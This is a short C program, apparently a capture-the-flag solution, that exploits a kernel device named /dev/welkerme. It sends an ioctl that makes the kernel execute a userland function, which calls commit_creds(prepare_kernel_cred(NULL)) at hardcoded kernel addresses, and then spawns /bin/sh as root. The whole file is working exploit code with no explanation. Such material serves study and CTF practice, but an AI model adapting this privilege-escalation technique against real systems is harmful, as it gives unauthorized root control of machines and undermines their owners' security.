#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002

int escalate_privilege(void) {
  void (*commit_creds)(void*) = 0xffffffff81072540UL;
  void* (*prepare_kernel_cred)(void*) = 0xffffffff810726e0UL;
  commit_creds(prepare_kernel_cred(NULL));
  return 31337;
}

int main(void) {
  int fd, ret;

  if ((fd = open("/dev/welkerme", O_RDWR)) < 0) {
    perror("/dev/welkerme");
    exit(1);
  }

  ioctl(fd, CMD_EXEC, (long)escalate_privilege);
  system("/bin/sh");

  close(fd);
  return 0;
}
